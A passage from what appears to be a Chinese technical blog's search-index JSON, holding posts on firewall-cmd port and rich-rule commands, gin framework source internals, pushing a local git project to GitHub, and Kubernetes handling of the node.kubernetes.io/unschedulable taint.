","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:7:0","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"添加多个端口 firewall-cmd --permanent --zone=public --add-port=8080-8083/tcp ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:8:0","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"删除某个端口 firewall-cmd --permanent --zone=public --remove-port=81/tcp ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:9:0","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"针对某个 IP开放端口 firewall-cmd --permanent --add-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.142.166\" port protocol=\"tcp\" port=\"6379\" accept\"` `firewall-cmd --permanent --add-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.0.233\" accept\" ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:10:0","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"删除某个IP firewall-cmd --permanent --remove-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.1.51\" accept\" ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:11:0","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"针对一个ip段访问 firewall-cmd --permanent --add-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.0.0/16\" accept\"` `firewall-cmd --permanent --add-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.1.0/24\" port protocol=\"tcp\" port=\"9200\" accept\" ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:12:0","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"添加操作后别忘了执行重载 firewall-cmd --reload ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:12:1","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"firewalld开启端口配置 比如开启某服务（mysql）端口：3306，可以使用下面命令 aport=3306 firewall-cmd --zone=public --add-port=${aport}/tcp --permanent firewall-cmd --reload firewall-cmd --list-all ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:13:0","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"firewalld关闭端口配置 比如关闭某服务（mysql）端口：3306，可以使用下面命令 aport=3306 firewall-cmd --zone=public --remove-port=${aport}/tcp --permanent firewall-cmd --reload firewall-cmd --list-all ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:14:0","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"示例 ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:15:0","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"放开3306端口 firewall-cmd --zone=public --add-port=3306/tcp --permanent firewall-cmd --reload firewall-cmd --list-all ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:15:1","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"移除3306端口 firewall-cmd --zone=public --remove-port=3306/tcp --permanent firewall-cmd --reload firewall-cmd --list-all ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:15:2","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"添加主机和访问服务端口 添加源ip地址：192.168.1.2，端口：21的访问 firewall-cmd --add-rich-rule='rule family=\"ipv4\" source address=192.168.1.2/32 port port=21 protocol=tcp accept' --permanent ipaddrs=\"192.168.1.2\" firewall-cmd --add-rich-rule='rule family=\"ipv4\" source address=\"${ipaddrs}\" protocol=tcp accept' --permanent firewall-cmd --reload firewall-cmd --list-all ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:15:3","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Go"],"content":"介绍 gin 框架基于 httprouter 实现最重要的路由模块,采用类似字典树一样的数据结构来存储路由与handle方法的映射.也是框架高性能的原因,有兴趣的同学可以自行查阅 本文提供 在线思维导图 搭配文章看事半功倍 Engine 容器对象,整个框架的基础 Engine.trees 负责存储路由和handle方法的映射,采用类似字典树的结构 Engine.RouterGroup,其中的Handlers存储着所有中间件 Context上下文对象,负责处理请求和回应,其中的handlers是存储处理请求时中间件和处理方法的 ","date":"2022-07-09","objectID":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/:1:0","tags":["Go"],"title":"【转载】gin介绍","uri":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"初始化容器 通过调用 gin.New() 方法来实例化Engine. 虽然参数很多,但我们只需要注意 RouterGroup ,trees和 engine.pool.New即可 engine.pool.New 负责创建Context对象,采用sync.Pool减少频繁context实例化带来的资源消耗, func New() *Engine { debugPrintWARNINGNew() engine := \u0026Engine{ //实例化RouterGroup,其中Handlers为中间件数组 RouterGroup: RouterGroup{ Handlers: nil, basePath: \"/\", root: true, }, FuncMap: template.FuncMap{}, RedirectTrailingSlash: true, RedirectFixedPath: false, HandleMethodNotAllowed: false, ForwardedByClientIP: true, AppEngine: defaultAppEngine, UseRawPath: false, RemoveExtraSlash: false, UnescapePathValues: true, MaxMultipartMemory: defaultMultipartMemory, //trees 是最重要的点!!!!负责存储路由和handle方法的映射,采用类似字典树的结构 trees: make(methodTrees, 0, 9), delims: render.Delims{Left: \"{{\", Right: \"}}\"}, secureJsonPrefix: \"while(1);\", } engine.RouterGroup.engine = engine //这里采用 sync/pool 实现context池,减少频繁context实例化带来的资源消耗 engine.pool.New = func() interface{} { return engine.allocateContext() } return engine } ","date":"2022-07-09","objectID":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/:2:0","tags":["Go"],"title":"【转载】gin介绍","uri":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"注册中间件 gin的高性能主要依靠trees,每一个节点的内容你可以想象成一个key-\u003evalue的字典树,key是路由,而value则是一个[]HandlerFunc,里面存储的就是按顺序执行的中间件和handle控制器方法,这里很重要,要考! ","date":"2022-07-09","objectID":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/:3:0","tags":["Go"],"title":"【转载】gin介绍","uri":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"注册全局中间件 gin.use() 调用RouterGroup.Use()往RouterGroup.Handlers写入记录 func (engine *Engine) Use(middleware ...HandlerFunc) IRoutes { engine.RouterGroup.Use(middleware...) engine.rebuild404Handlers() //注册404处理方法 engine.rebuild405Handlers() //注册405处理方法 return engine } // 其中`Handlers`字段就是一个数组,用来存储中间件 func (group *RouterGroup) Use(middleware ...HandlerFunc) IRoutes { group.Handlers = append(group.Handlers, middleware...) return group.returnObj() } ","date":"2022-07-09","objectID":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/:3:1","tags":["Go"],"title":"【转载】gin介绍","uri":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"注册路由组中间件 通过 Group()方法返回一个 新生成的RouterGroup指针,用来分开每个路由组加载不一样的中间件 注意这里的Handlers: group.combineHandlers(handlers),这行代码会复制一份全局中间件到新生成的RouterGroup.Handlers中,接下来路由注册的时候就可以一起写入树节点中 group := g.Group(\"/test_group\") group.Use(middleware.Test()) { //这里会最终路由和中间件以及handle方法一起写入树节点中 group.GET(\"/test\",handler.TestTool) } //返回一个RouterGroup指针 func (group *RouterGroup) Group(relativePath string, handlers ...HandlerFunc) *RouterGroup { return \u0026RouterGroup{ //复制一份全局中间件 Handlers: group.combineHandlers(handlers), basePath: group.calculateAbsolutePath(relativePath), engine: group.engine, } } ","date":"2022-07-09","objectID":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/:3:2","tags":["Go"],"title":"【转载】gin介绍","uri":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"注册路由以及中间件 不管哪种请求方式最终都会调用RouterGroup.handle,这个方法主要有两个作用 处理路由的格式,将路由拼成 ‘/’ 字符开头的路由 复制一份RouterGroup.Handlers,加上相应这次路由的handle方法,组成一个list放入树节点中 最后调用trees.addRoute增加节点 g.GET(\"/test_tool\", middleware.Test(),handler.TestTool) func (group *RouterGroup) handle(httpMethod, relativePath string, handlers HandlersChain) IRoutes { //根目录和路由结合起来,将路由拼成 '/' 字符开头的路由 absolutePath := group.calculateAbsolutePath(relativePath) //复制一份RouterGroup.Handlers,加上相应这次路由的handle方法,组成一个list放入树节点中 handlers = group.combineHandlers(handlers) group.engine.addRoute(httpMethod, absolutePath, handlers) return group.returnObj() } //调用 `trees`增加节点 func (engine *Engine) addRoute(method, path string, handlers HandlersChain) { assert1(path[0] == '/', \"path must begin with '/'\") assert1(method != \"\", \"HTTP method can not be empty\") assert1(len(handlers) \u003e 0, \"there must be at least one handler\") debugPrintRoute(method, path, handlers) root := engine.trees.get(method) if root == nil { root = new(node) root.fullPath = \"/\" engine.trees = append(engine.trees, methodTree{method: method, root: root}) } root.addRoute(path, handlers) } ","date":"2022-07-09","objectID":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/:4:0","tags":["Go"],"title":"【转载】gin介绍","uri":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"启动 通过调用net/http来启动服务,由于engine实现了ServeHTTP方法,只需要直接传engine对象就可以完成初始化并启动 g.Run() func (engine *Engine) Run(addr ...string) (err error) { defer func() { debugPrintError(err) }() address := resolveAddress(addr) debugPrint(\"Listening and serving HTTP on %s\\n\", address) err = http.ListenAndServe(address, engine) return } func ListenAndServe(addr string, handler Handler) error { server := \u0026Server{Addr: addr, Handler: handler} return server.ListenAndServe() } //来自 net/http 定义的接口,只要实现了这个接口就可以作为处理请求的函数 type Handler interface { ServeHTTP(ResponseWriter, *Request) } //实现了ServeHTTP方法 func (engine *Engine) ServeHTTP(w http.ResponseWriter, req *http.Request) { c := engine.pool.Get().(*Context) c.writermem.reset(w) c.Request = req c.reset() engine.handleHTTPRequest(c) engine.pool.Put(c) } ","date":"2022-07-09","objectID":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/:5:0","tags":["Go"],"title":"【转载】gin介绍","uri":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"处理请求 这里只需要留意handleHTTPRequest(c *Context) 方法就好了 通过请求方法和路由找到相对应的树节点,获取储存的[]HandlerFunc列表,通过调用c.Next()处理请求 通过不停的移动下标递归,最后完成处理返回结果 func (engine *Engine) handleHTTPRequest(c *Context) { ... // t := engine.trees for i, tl := 0, len(t); i \u003c tl; i++ { ... // Find route in tree value := root.getValue(rPath, c.Params, unescape) if value.handlers != nil { c.handlers = value.handlers c.Params = value.params c.fullPath = value.fullPath c.Next() c.writermem.WriteHeaderNow() return } ... } ... } //这里挺巧妙的,通过不停的移动下标递归,最后完成处理返回结果 func (c *Context) Next() { c.index++ for c.index \u003c int8(len(c.handlers)) { c.handlers[c.index](c) c.index++ } } ","date":"2022-07-09","objectID":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/:6:0","tags":["Go"],"title":"【转载】gin介绍","uri":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"参考文档 gin中文文档 gin项目地址 httprouter 全网最详细的gin源码解析 ","date":"2022-07-09","objectID":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/:7:0","tags":["Go"],"title":"【转载】gin介绍","uri":"/posts/2022/07/%E8%BD%AC%E8%BD%BDgin%E4%BB%8B%E7%BB%8D/"},{"categories":["开发"],"content":"github上传本地项目","date":"2022-06-30","objectID":"/posts/2022/06/github%E4%B8%8A%E4%BC%A0%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE/","tags":["Git"],"title":"github上传本地项目","uri":"/posts/2022/06/github%E4%B8%8A%E4%BC%A0%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE/"},{"categories":["开发"],"content":"github上传本地项目的操作命令 ","date":"2022-06-30","objectID":"/posts/2022/06/github%E4%B8%8A%E4%BC%A0%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE/:0:0","tags":["Git"],"title":"github上传本地项目","uri":"/posts/2022/06/github%E4%B8%8A%E4%BC%A0%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE/"},{"categories":["开发"],"content":"步骤 1、在本地创建一个版本库（即文件夹），通过git init把它变成Git仓库； 2、把项目复制到这个文件夹里面，再通过git add .把项目添加到仓库； 3、再通过git commit -m “注释内容\"把项目提交到仓库； 4、在Github上设置好SSH密钥后，新建一个远程仓库，通过 git remote add origin https://github.com/username/example.git 将本地仓库和远程仓库进行关联； 5、最后通过git push -u origin master把本地仓库的项目推送到远程仓库（也就是Github）上 ","date":"2022-06-30","objectID":"/posts/2022/06/github%E4%B8%8A%E4%BC%A0%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE/:1:0","tags":["Git"],"title":"github上传本地项目","uri":"/posts/2022/06/github%E4%B8%8A%E4%BC%A0%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE/"},{"categories":["开发"],"content":"操作 在本地项目目录下 echo \"# go-file-json-server\" \u003e\u003e README.md git init //把这个目录变成Git可以管理的仓库 git add . //不但可以跟单一文件，还可以跟通配符，更可以跟目录。一个点就把当前目录下所有未追踪的文件全部add了 git commit -m \"first commit\" //把文件提交到仓库 git branch -M main //重命名分支，可使用-M强制重命名 git remote add origin git@github.com:bingerambo/go-file-json-server.git //关联远程仓库 git push -u origin main //把本地库的所有内容推送到远程库上 ","date":"2022-06-30","objectID":"/posts/2022/06/github%E4%B8%8A%E4%BC%A0%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE/:2:0","tags":["Git"],"title":"github上传本地项目","uri":"/posts/2022/06/github%E4%B8%8A%E4%BC%A0%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE/"},{"categories":["开发"],"content":"示例 以我的一个工具项目为例 git init git add . git commit -am \"first create commit\" git branch -M main git remote add origin git@github.com:bingerambo/go-file-json-server.git git push -u origin main ","date":"2022-06-30","objectID":"/posts/2022/06/github%E4%B8%8A%E4%BC%A0%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE/:3:0","tags":["Git"],"title":"github上传本地项目","uri":"/posts/2022/06/github%E4%B8%8A%E4%BC%A0%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE/"},{"categories":["K8S"],"content":"k8s对 noschedule taint：node.kubernetes.io/unschedulable 的处理","date":"2022-05-31","objectID":"/posts/2022/05/k8s%E5%AF%B9-noschedule-taintnode.kubernetes.io/unschedulable-%E7%9A%84%E5%A4%84%E7%90%86/","tags":["K8S"],"title":"k8s对 noschedule taint：node.kubernetes.io/unschedulable 的处理","uri":"/posts/2022/05/k8s%E5%AF%B9-noschedule-taintnode.kubernetes.io/unschedulable-%E7%9A%84%E5%A4%84%E7%90%86/"},{"categories":["K8S"],"content":"问题：node.kubernetes.io/unschedulable 给节点设置为不可调度，未能生效 k8s版本：1.20.5 通过kubect taintl命令给节点设置为不可调度，并驱逐pod kubectl taint nodes node3 node.kubernetes.io/unschedulable=:NoSchedule kubectl taint nodes node3 node.kubernetes.io/unschedulable=:NoExecute 发现命令执行成功，但node的taints为空，node.kubernetes.io/unschedulable 的 key：effect没有生效。 此时节点仍可调度。 而执行其它的taints标签操作，操作成功并生效 kubectl taint nodes node3 node-role.kubernetes.io/node=:NoSchedule kubectl taint nodes node3 node-role.kubernetes.io/node=:NoExecute kubectl taint nodes node3 node-role.kubernetes.io/node=:NoSchedule- kubectl taint nodes node3 node-role.kubernetes.io/node=:NoExecute- 此时，节点设置为不可调度，并能驱逐pod ","date":"2022-05-31","objectID":"/posts/2022/05/k8s%E5%AF%B9-noschedule-taintnode.kubernetes.io/unschedulable-%E7%9A%84%E5%A4%84%E7%90%86/:1:0","tags":["K8S"],"title":"k8s对 noschedule taint：node.kubernetes.io/unschedulable 的处理","uri":"/posts/2022/05/k8s%E5%AF%B9-noschedule-taintnode.kubernetes.io/unschedulable-%E7%9A%84%E5%A4%84%E7%90%86/"},{"categories":["K8S"],"content":"node-lifecycle-controller Kube-controller-manager之node-lifecycle-controller 处理了node的状态信息 ","date":"2022-05-31","objectID":"/posts/2022/05/k8s%E5%AF%B9-noschedule-taintnode.kubernetes.io/unschedulable-%E7%9A%84%E5%A4%84%E7%90%86/:2:0","tags":["K8S"],"title":"k8s对 noschedule taint：node.kubernetes.io/unschedulable 的处理","uri":"/posts/2022/05/k8s%E5%AF%B9-noschedule-taintnode.kubernetes.io/unschedulable-%E7%9A%84%E5%A4%84%E7%90%86/"},{"categories":["K8S"],"content":"well_known_taints 可以看到k8s node 已内置了一些taints key package v1 const ( // TaintNodeNotReady will be added when node is not ready // and removed when node becomes ready. TaintNodeNotReady = \"node.kubernetes.io/not-ready\" // TaintNodeUnreachable will be added when node becomes unreachable // (corresponding to NodeReady status ConditionUnknown) // and removed when node becomes reachable (NodeReady status ConditionTrue). TaintNodeUnreachable = \"node.kubernetes.io/unreachable\" // TaintNodeUnschedulable will be added when node becomes unschedulable // and removed when node becomes scheduable. // 目前设置不可调度用到的taint key TaintNodeUnschedulable = \"node.kubernetes.io/unschedulable\" // TaintNodeMemoryPressure will be added when node has memory pressure // and removed when node has enough memory. TaintNodeMemoryPressure = \"node.kubernetes.io/memory-pressure\" // TaintNodeDiskPressure will be added when node has disk pressure // and removed when node has enough disk. TaintNodeDiskPressure = \"node.kubernetes.io/disk-pressure\" // TaintNodeNetworkUnavailable will be added when node's network is unavailable // and removed when network becomes ready. TaintNodeNetworkUnavailable = \"node.kubernetes.io/network-unavailable\" // TaintNodePIDPressure will be added when node has pid pressure // and removed when node has enough disk. TaintNodePIDPressure = \"node.kubernetes.io/pid-pressure\" ) ","date":"2022-05-31","objectID":"/posts/2022/05/k8s%E5%AF%B9-noschedule-taintnode.kubernetes.io/unschedulable-%E7%9A%84%E5%A4%84%E7%90%86/:2:1","tags":["K8S"],"title":"k8s对 noschedule taint：node.kubernetes.io/unschedulable 的处理","uri":"/posts/2022/05/k8s%E5%AF%B9-noschedule-taintnode.kubernetes.io/unschedulable-%E7%9A%84%E5%A4%84%E7%90%86/"},{"categories":["K8S"],"content":"NodeLifecycle // NewNodeLifecycleController returns a new taint controller. func NewNodeLifecycleController( leaseInformer coordinformers.LeaseInformer, podInformer coreinformers.PodInformer, nodeInformer coreinformers.NodeInformer, daemonSetInformer appsv1informers.DaemonSetInformer, kubeClient clientset.Interface, nodeMonitorPeriod time.Duration, nodeStartupGracePeriod time.Duration, nodeMonitorGracePeriod time.Duration, podEvictionTimeout time.Duration, evictionLimiterQPS float32, secondaryEvictionLimiterQPS float32, largeClusterThreshold int32, unhealthyZoneThreshold float32, runTaintManager bool, ) (*Controller, error) { // ... } ","date":"2022-05-31","objectID":"/posts/2022/05/k8s%E5%AF%B9-noschedule-taintnode.kubernetes.io/unschedulable-%E7%9A%84%E5%A4%84%E7%90%86/:2:2","tags":["K8S"],"title":"k8s对 noschedule taint：node.kubernetes.io/unschedulable 的处理","uri":"/posts/2022/05/k8s%E5%AF%B9-noschedule-taintnode.kubernetes.io/unschedulable-%E7%9A%84%E5%A4%84%E7%90%86/"},{"categories":["K8S"],"content":"Taint // The node this Taint is attached to has the \"effect\" on // any pod that does not tolerate the Taint. type Taint struct { // Required. The taint key to be applied to a node. Key string `json:\"key\" protobuf:\"bytes,1,opt,name=key\"` // The taint value corresponding to the taint key. // +optional Value string `json:\"value,omitempty\" protobuf:\"bytes,2,opt,name=value\"` // Required. The effect of the taint on pods // that do not tolerate the taint. // Valid effects are NoSchedule, PreferNoSchedule and NoExecute. Effect TaintEffect `json:\"effect\" protobuf:\"bytes,3,opt,name=effect,casttype=TaintEffect\"` // TimeAdded represents the time at which the taint was added. // It is only written for NoExecute taints. // +optional TimeAdded *metav1.Time `json:\"timeAdded,omitempty\" protobuf:\"bytes,4,opt,name=timeAdded\"` } type TaintEffect string const ( // Do not allow new pods to schedule onto the node unless they tolerate the taint, // but allow all pods submitted to Kubelet without going through the scheduler // to start, and allow all already-running pods to continue running. // Enforced by the scheduler. TaintEffectNoSchedule TaintEffect = \"NoSchedule\" // Like TaintEffectNoSchedule, but the scheduler tries not to schedule // new pods onto the node, rather than prohibiting new pods from scheduling // onto the node entirely. Enforced by the scheduler. TaintEffectPreferNoSchedule TaintEffect = \"PreferNoSchedule\" // NOT YET IMPLEMENTED. TODO: Uncomment field once it is implemented. // Like TaintEffectNoSchedule, but additionally do not allow pods submitted to // Kubelet without going through the scheduler to start. // Enforced by Kubelet and the scheduler. // TaintEffectNoScheduleNoAdmit TaintEffect = \"NoScheduleNoAdmit\" // Evict any already-running pods that do not tolerate the taint. // Currently enforced by NodeController. TaintEffectNoExecute TaintEffect = \"NoExecute\" ) ","date":"2022-05-31","objectID":"/posts/2022/05/k8s%E5%AF%B9-noschedule-taintnode.kubernetes.io/unschedulable-%E7%9A%84%E5%A4%84%E7%90%86/:2:3","tags":["K8S"],"title":"k8s对 noschedule taint：node.kubernetes.io/unschedulable 的处理","uri":"/posts/2022/05/k8s%E5%AF%B9-noschedule-taintnode.kubernetes.io/unschedulable-%E7%9A%84%E5%A4%84%E7%90%86/"},{"categories":["K8S"],"content":"doNoScheduleTaintingPass 注意这里对taints的处理 func (nc *Controller) doNoScheduleTaintingPass(nodeName string) error { node, err := nc.nodeLister.Get(nodeName) if err != nil { // If node not found, just ignore it. if apierrors.IsNotFound(err) { return nil } return err } // Map node's condition to Taints. var taints []v1.Taint for _, condition := range node.Status.Conditions { if taintMap, found := nodeConditionToTaintKeyStatusMap[condition.Type]; found { if taintKey, found := taintMap[condition.Status]; found { taints = append(taints, v1.Taint{ Key: taintKey, Effect: v1.TaintEffectNoSchedule, }) } } } // 这里，先判断了node.Spec.Unschedulable，只有node.Spec.Unschedulable=true， // 才配置了TaintNodeUnschedulable key: \"node.kubernetes.io/unschedulable\" if node.Spec.Unschedulable { // If unschedulable, append related taint. taints = append(taints, v1.Taint{ Key: v1.TaintNodeUnschedulable, Effect: v1.TaintEffectNoSchedule, }) } // Get exist taints of node. // 这里做了过滤处理，获取node内置taintKeyToNodeConditionMap的key对应的taints nodeTaints := taintutils.TaintSetFilter(node.Spec.Taints, func(t *v1.Taint) bool { // only NoSchedule taints are candidates to be compared with \"taints\" later if t.Effect != v1.TaintEffectNoSchedule { return false } // Find unschedulable taint of node. if t.Key == v1.TaintNodeUnschedulable { return true } // Find node condition taints of node. _, found := taintKeyToNodeConditionMap[t.Key] return found }) // 比较taints, nodeTaints taintsToAdd, taintsToDel := taintutils.TaintSetDiff(taints, nodeTaints) // If nothing to add not delete, return true directly. if len(taintsToAdd) == 0 \u0026\u0026 len(taintsToDel) == 0 { return nil } if !nodeutil.SwapNodeControllerTaint(nc.kubeClient, taintsToAdd, taintsToDel, node) { return fmt.Errorf(\"failed to swap taints of node %+v\", node) } return nil } 总结：k8s对节点的TaintNodeUnschedulable taints处理，是需要根据node.Spec.Unschedulable标识，进行过滤处理的。在k8s1.20.5版本测试中，当仅设置node.Spec.Unschedulable为true时，k8s默认会自动添加TaintNodeUnschedulable key: “node.kubernetes.io/unschedulable” ","date":"2022-05-31","objectID":"/posts/2022/05/k8s%E5%AF%B9-noschedule-taintnode.kubernetes.io/unschedulable-%E7%9A%84%E5%A4%84%E7%90%86/:2:4","tags":["K8S"],"title":"k8s对 noschedule taint：node.kubernetes.io/unschedulable 的处理","uri":"/posts/2022/05/k8s%E5%AF%B9-noschedule-taintnode.kubernetes.io/unschedulable-%E7%9A%84%E5%A4%84%E7%90%86/"},{"categories":["K8S"],"content":"附录 除了taint，还要考虑tolerance容忍度对污点标签taint的影响，可以参考下面文章 k8s 的污点（Taint）和容忍度（Toleration）https://zhuanlan.zhihu.com/p/405348246 ","date":"2022-05-31","objectID":"/posts/2022/05/k8s%E5%AF%B9-noschedule-taintnode.kubernetes.io/unschedulable-%E7%9A%84%E5%A4%84%E7%90%86/:3:0","tags":["K8S"],"title":"k8s对 noschedule taint：node.kubernetes.io/unschedulable 